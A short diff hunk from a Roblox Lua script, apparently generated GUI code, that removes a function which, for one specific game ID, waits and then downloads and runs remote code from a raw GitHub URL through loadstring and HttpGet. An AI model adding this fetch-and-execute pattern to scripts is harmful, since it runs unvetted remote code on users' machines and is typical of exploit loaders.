@@ -91,12 +91,3 @@ local function XUAPOO_fake_script() -- q.u
 	
 end
 coroutine.wrap(XUAPOO_fake_script)()
-local function XUAMOO_fake_script() -- q.p 
-	local script = Instance.new('LocalScript', q)
-
-	
-if game.GameId == 9690208731 then
-	wait(7)
-	loadstring(game:HttpGet(('https://raw.githubusercontent.com/kl0nx/v3patru/main/DAH'),true))()
-end
-coroutine.wrap(XUAMOO_fake_script)()
